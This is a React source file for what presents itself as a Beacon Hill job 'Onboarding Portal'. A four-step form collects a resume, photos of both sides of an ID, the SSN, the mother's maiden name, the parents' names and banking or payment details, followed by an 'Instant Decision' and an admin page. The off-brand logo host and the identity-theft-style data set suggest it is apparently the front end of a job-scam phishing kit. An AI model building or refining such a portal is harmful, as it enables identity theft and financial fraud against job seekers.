import React, { useState } from 'react';
import { Routes, Route, useNavigate, Navigate } from 'react-router-dom';
import AccordionItem from './components/AccordionItem';
import FormStep1 from './components/FormStep1';
import FormStep2 from './components/FormStep2';
import FormStep3 from './components/FormStep3';
import FormStep4 from './components/FormStep4';
import LandingPage from './components/LandingPage';
import AdminPage from './components/AdminPage';
import { ApplicationData } from './types';
import { submitApplication } from './services/submissionService';
import Toast from './components/Toast';

const App: React.FC = () => {
  const navigate = useNavigate();
  const [activeStep, setActiveStep] = useState<number>(1);
  const [isSubmitting, setIsSubmitting] = useState<boolean>(false);
  const [submissionError, setSubmissionError] = useState<string | null>(null);
  const [formData, setFormData] = useState<ApplicationData>({
    email: '',
    confirmEmail: '',
    firstName: '',
    middleName: '',
    lastName: '',
    dobDay: '',
    dobMonth: '',
    dobYear: '',
    gender: 'Male',
    phone: '',
    preferredContact: '',
    contactViaTexts: '',
    isVerified: false,
    resumeText: '',
    mothersFullName: '',
    mothersMaidenName: '',
    fathersFullName: '',
    ssn: '',
    agreedToTerms: false,
    infoAccurate: false,
    decisionStatus: null,
    paymentMethod: '',
    authorized: false
  });
  const [submissionSuccess, setSubmissionSuccess] = useState<boolean>(false);

  const [toast, setToast] = useState<{ message: string; type: 'success' | 'error'; isVisible: boolean }>({
    message: '',
    type: 'success',
    isVisible: false
  });

  const showToast = (message: string, type: 'success' | 'error') => {
    setToast({ message, type, isVisible: true });
  };

  const validateStep = (step: number) => {
    switch (step) {
      case 1:
        return formData.email && formData.firstName && formData.lastName && (formData as any).resumeFile;
      case 2:
        return (formData as any).idFrontFile && (formData as any).idBackFile;
      case 3:
        return formData.mothersFullName && formData.mothersMaidenName && formData.fathersFullName && formData.ssn && formData.agreedToTerms && formData.infoAccurate;
      case 4:
        return formData.paymentMethod && formData.authorized;
      default:
        return true;
    }
  };

  const handleNextStep = () => {
    if (validateStep(activeStep)) {
      if (activeStep < 4) setActiveStep(activeStep + 1);
    } else {
      showToast("Please fill in all required fields and upload necessary documents.", "error");
    }
  };

  const handlePrevStep = () => {
    if (activeStep > 1) setActiveStep(activeStep - 1);
  };

  const handleSubmitApplication = async () => {
    setIsSubmitting(true);
    setSubmissionError(null);
    setSubmissionSuccess(false);

    try {
      // Assuming formData.idFrontFile and formData.resumeFile exist and are File objects
      // If they are not part of ApplicationData, you might need to adjust their handling
      // For this example, I'm assuming they are present in formData for submission.
      // If formData doesn't directly store files, you'd need separate states for them.
      await submitApplication(formData, {
        idFront: (formData as any).idFrontFile, // Type assertion or add to ApplicationData
        idBack: (formData as any).idBackFile,   // Type assertion or add to ApplicationData
        resume: (formData as any).resumeFile,   // Type assertion or add to ApplicationData
      });
      setSubmissionSuccess(true);
      showToast("Application Submitted Successfully!", "success");
      setTimeout(() => {
        navigate('/');
      }, 2000);
    } catch (error) {
      showToast("Failed to submit application. Please try again.", "error");
      console.error(error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const renderStep = () => {
    switch (activeStep) {
      case 1: return <FormStep1 formData={formData} setFormData={setFormData} />;
      case 2: return <FormStep2 formData={formData} setFormData={setFormData} />;
      case 3: return <FormStep3 formData={formData} setFormData={setFormData} />;
      case 4: return <FormStep4 formData={formData} setFormData={setFormData} />;
      default: return null;
    }
  };

  const getStepTitle = () => {
    switch (activeStep) {
      case 4: return `MODE OF PAYMENT - Step ${activeStep} of 4`;
      default: return `Step ${activeStep} of 4`;
    }
  };

  return (
    <Routes>
      <Route path="/" element={<LandingPage onStart={() => navigate('/apply')} />} />
      <Route path="/admin" element={<AdminPage onBackToForm={() => navigate('/apply')} />} />
      <Route path="/apply" element={
        <ApplyLayout
          activeStep={activeStep}
          setActiveStep={setActiveStep}
          renderStep={renderStep}
          getStepTitle={getStepTitle}
          handlePrevStep={handlePrevStep}
          handleNextStep={handleNextStep}
          handleSubmitApplication={handleSubmitApplication}
          isSubmitting={isSubmitting}
          submissionSuccess={submissionSuccess}
          navigate={navigate}
          toast={toast}
          setToast={setToast}
        />
      } />
      <Route path="*" element={<Navigate to="/" replace />} />
    </Routes>
  );
};

// Component for the Form Layout
interface ApplyLayoutProps {
  activeStep: number;
  setActiveStep: (step: number) => void;
  renderStep: () => React.ReactNode;
  getStepTitle: () => string;
  handlePrevStep: () => void;
  handleNextStep: () => void;
  handleSubmitApplication: () => void;
  isSubmitting: boolean;
  submissionSuccess: boolean;
  navigate: (path: string) => void;
  toast: { message: string; type: 'success' | 'error'; isVisible: boolean };
  setToast: (toast: { message: string; type: 'success' | 'error'; isVisible: boolean }) => void;
}

const ApplyLayout: React.FC<ApplyLayoutProps> = ({
  activeStep, setActiveStep, renderStep, getStepTitle,
  handlePrevStep, handleNextStep, handleSubmitApplication,
  isSubmitting, submissionSuccess, navigate, toast, setToast
}) => {
  return (
    <div className="min-h-screen bg-[#f4f7f9] relative overflow-hidden">
      {/* GLOBAL HEADER (Navigation back to landing) */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <button onClick={() => navigate('/')} className="flex items-center gap-2">
            <img src="https://bhsrr.com/wp-content/uploads/2026/01/WhatsApp_Image_2026-01-10_at_11.28.12_PM-removebg-preview.png" className="h-10" alt="Beacon Hill" />
          </button>
          <div className="flex items-center gap-4">
            <span className="text-xs font-bold text-gray-400 uppercase tracking-widest hidden md:inline">Onboarding Portal</span>
















































































            <button
              onClick={() => navigate('/admin')} // Toggle to Admin Page
              className="text-gray-500 hover:text-[#066aab] text-sm font-medium transition-colors flex items-center gap-1"
            >
              <i className="fa-solid fa-user-gear"></i> Admin
            </button>














            <button onClick={() => navigate('/')} className="text-gray-500 hover:text-[#066aab] text-sm font-medium transition-colors flex items-center gap-1">
              <i className="fa-solid fa-house"></i> Exit
            </button>
          </div>
        </div>

      </header>



      <div className="py-12 px-4 md:px-8">
        <div className="max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-12 gap-10 items-start relative z-10">

          {/* LEFT COLUMN: NAVIGATION / INSTRUCTIONS (Constant across steps) */}
          <div className="lg:col-span-4 sticky top-12">
            <div className="space-y-3">
              <AccordionItem
                title="Submit Interest Form and Resume"
                icon="fa-solid fa-file-contract"
                isActive={activeStep === 1}
                onClick={() => setActiveStep(1)}
              >
                <p>• Instructions: Fill out the form with your details, including your name, email, and resume. Ensure that your information is accurate to avoid delays.</p>
                <p>• Privacy Note: Your personal information will only be used for recruitment purposes. It will not be shared without your consent.</p>
              </AccordionItem>

              <AccordionItem
                title="Complete Identity Verification"
                icon="fa-regular fa-circle-check"
                isActive={activeStep === 2}
                onClick={() => setActiveStep(2)}
              >
                <p>• Instructions: Verify your identity by providing a valid ID or other necessary documentation. This helps us confirm your eligibility for the role.</p>
                <p>• Privacy Note: Your data is encrypted and stored securely. We adhere to strict privacy regulations to protect your identity.</p>
              </AccordionItem>





















              <AccordionItem
                title="Instant Decision"
                icon="fa-regular fa-lightbulb"
                isActive={activeStep === 3}
                onClick={() => setActiveStep(3)}
              >
                <p>• Instructions: After submitting your application and verifying your identity, our system will process your application, and you’ll receive a decision promptly.</p>
                <p>• Privacy Note: Automated decisions are made based on your qualifications and role fit. Contact us if you have questions about the process.</p>
              </AccordionItem>

              <AccordionItem
                title="Set Up Direct Deposit"
                icon="fa-solid fa-building-columns"
                isActive={activeStep === 4}
                onClick={() => setActiveStep(4)}
              >
                <p>• Instructions: If hired, provide your banking information for direct deposit of your salary. Ensure accuracy to prevent payment issues.</p>
                <p>• Privacy Note: Banking details are handled securely and used only for payroll purposes.</p>
              </AccordionItem>
            </div>
          </div>

          {/* RIGHT COLUMN: THE DYNAMIC FORM (Changes based on Step) */}
          <div className="lg:col-span-8 bg-transparent min-h-[600px]">
            {/* Header & Progress Indicator */}
            <div className="mb-8">
              <div className="mb-2">
                <span className="text-[16px] font-medium text-gray-700">{getStepTitle()}</span>
              </div>
              <div className="w-full bg-gray-200 h-[10px] rounded-full overflow-hidden">
                <div
                  className="h-full bg-[#066aab] transition-all duration-700 ease-in-out"
                  style={{ width: `${(activeStep / 4) * 100}%` }}
                ></div>
              </div>
            </div>

            <div className="bg-transparent p-2 rounded-lg">
              {renderStep()}

              <div className="mt-8 flex flex-col sm:flex-row items-center gap-4">
                {activeStep > 1 && (
                  <button
                    onClick={handlePrevStep}
                    className="w-full sm:w-auto bg-[#066aab] text-white px-8 py-2.5 rounded-lg font-bold text-[14px] hover:bg-[#05588f] transition-all"
                  >
                    Previous
                  </button>
                )}
                <button
                  onClick={activeStep === 4 ? handleSubmitApplication : handleNextStep}
                  className="w-full sm:w-auto bg-[#066aab] text-white px-8 py-2.5 rounded-lg font-bold text-[14px] hover:bg-[#05588f] transition-all disabled:opacity-50"
                  disabled={isSubmitting}
                >
                  {isSubmitting ? (
                    <span className="flex items-center gap-2">
                      <i className="fas fa-spinner fa-spin"></i> Submitting...
                    </span>
                  ) : activeStep === 4 ? 'Submit Application' : 'Next'}
                </button>
                {submissionSuccess && (
                  <p className="text-green-500 text-sm font-bold flex items-center gap-2">
                    <i className="fas fa-check-circle"></i> Application submitted!
                  </p>
                )}
              </div>
            </div>
          </div>

        </div>
      </div>

      <Toast
        isVisible={toast.isVisible}
        message={toast.message}
        type={toast.type}
        onClose={() => setToast({ ...toast, isVisible: false })}
      />

      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(5px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out forwards;
        }
        /* Custom radio styling to match screenshot */
        input[type='radio'] {
           accent-color: #066aab;
           width: 16px;
           height: 16px;
        }
        input[type='checkbox'] {
           accent-color: #066aab;
           width: 16px;
           height: 16px;
        }
      `}</style>
    </div>
  );
};

export default App;
